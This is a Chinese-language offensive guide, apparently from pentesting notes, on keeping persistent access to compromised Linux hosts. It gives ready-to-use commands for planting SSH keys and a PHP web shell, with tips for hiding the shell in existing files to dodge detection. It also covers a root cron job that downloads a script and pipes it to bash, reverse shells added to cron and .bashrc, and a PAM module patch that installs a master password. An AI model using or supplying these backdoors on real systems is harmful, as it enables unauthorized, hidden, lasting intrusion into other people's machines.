#### SSH 后门 (SSH Backdoor)

建立持久化最可靠、最隐蔽的方法之一是在目标系统上留下你自己的 SSH 密钥。这允许你通过 SSH 客户端直接登录，获得一个稳定的、功能齐全的 Shell。

1. **生成密钥对**: 在目标用户的 Shell 中（通常是 `root`），使用 `ssh-keygen` 为该用户生成一个新的密钥对。
    
    Bash
    
    ```
    # -f 参数指定输出文件名，这里以用户名命名
    ssh-keygen -f <username>
    ```
    
2. **创建 `.ssh` 目录** (如果不存在):
    
    Bash
    
    ```
    mkdir -p ~/.ssh && chmod 0700 ~/.ssh
    ```
    
3. **添加公钥**: 将新生成的公钥 (`<username>.pub`) 的内容追加到 `authorized_keys` 文件中。
    
    Bash
    
    ```
    # 读取公钥内容并写入 authorized_keys
    cat <username>.pub >> ~/.ssh/authorized_keys
    ```
    
4. **设置权限**: 确保 `authorized_keys` 文件的权限正确，否则 SSH 服务会拒绝密钥认证。
    
    Bash
    
    ```
    chmod 600 ~/.ssh/authorized_keys
    ```
    
5. **连接**: 将新生成的私钥 (`<username>`) 从目标机器下载到你的攻击机，并使用它进行连接。
    
    Bash
    
    ```
    ssh -i <private_key_file> <username>@<target_ip>
    ```
    

> **注意**: 如果连接失败，高版本和低版本的 SSH 客户端/服务器之间可能存在加密算法不匹配的问题。使用 `-v` (verbose) 参数进行调试 (`ssh -v -i ...`)，可以查看详细的握手过程，以确定问题所在。

#### PHP 后门 (PHP Backdoor)

如果目标是一台 Web 服务器，可以在网站的根目录（通常是 `/var/www/html`）中放置一个简单的 PHP Web Shell 来执行命令。

PHP

```
<?php
  if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
  }
?>
```

##### 隐蔽技巧 (Stealth Tips)

1. **注入现有文件**: 不要创建新文件，而是将后门代码巧妙地插入到一个已有的、合法的 PHP 文件（如 `index.php`, `config.php`）的中间，使其更难被发现。
    
2. **更改参数名**: 将 `cmd` 参数更改为一个不那么引人注目的名称（例如 `id`, `page`, `cb`），以绕过简单的基于签名的检测规则。
    

#### Cronjob 后门 (Cronjob Backdoor)

`cron` 是 Linux 系统中用于执行计划任务的服务。通过在 `crontab` 文件（如 `/etc/crontab`）中添加一个条目，可以让系统定期（例如每分钟）执行一个命令来建立反向 Shell。

- **Crontab 条目示例**:
    
    ```
    # 每分钟、每小时、每一天... 以 root 用户身份执行命令
    * * * * * root    curl http://<your_ip>:8080/shell | bash
    ```
    
- **远程 `shell` 文件内容**:
    
    Bash
    
    ```
    #!/bin/bash
    bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1
    ```
    

这个组合会使目标系统每分钟都尝试从你的服务器下载 `shell` 脚本并执行它，从而为你提供一个持续的反向 Shell。

#### .bashrc 后门 (.bashrc Backdoor)

当一个用户启动一个交互式的 Bash Shell 时，其主目录下的 `.bashrc` 文件会被自动执行。我们可以利用这一点来建立持久化。

- **命令**: 将反向 Shell 的命令追加到目标用户的 `~/.bashrc` 文件中。
    
    Bash
    
    ```
    echo 'bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1' >> ~/.bashrc
    ```
    

下次该用户登录时，这个命令就会被执行，为你建立一个反向 Shell。

#### PAM 后门 (`pam_unix.so`) (PAM Backdoor)

这是一种更高级、更隐蔽的持久化技术，它通过修改系统的核心认证模块来实现。

- **工作原理**:
    
    1. Linux 系统使用 **PAM (Pluggable Authentication Modules)** 来处理用户认证。`pam_unix.so`是负责处理标准密码验证的核心模块。
        
    2. 此后门技术通过对 `pam_unix.so` 二进制文件进行补丁，插入一小段代码来拦截密码验证函数 `unix_verify_password`。
        
    3. 修改后的逻辑是：
        
        - **如果**用户输入的密码等于硬编码的“万能密码”（例如 `0xMitsurugi`），则立即返回认证成功 (`PAM_SUCCESS`)。
            
        - **否则**，继续执行原始的、正常的密码验证流程（即对照 `/etc/shadow` 文件中的哈希进行验证）。
            
- **优势**:
    
    - **极其隐蔽**: 不会创建新文件或进程，难以被发现。
        
    - **通用访问**: 你可以使用**任何**有效的用户名和你的万能密码来登录系统。
        
    - **不影响正常登录**: 正常用户的密码仍然有效。
        
- **自动化脚本**:
    
    - 手动修补二进制文件非常复杂。可以使用自动化脚本来完成此过程：[linux-pam-backdoor on GitHub](https://github.com/segmentati0nf4ult/linux-pam-backdoor)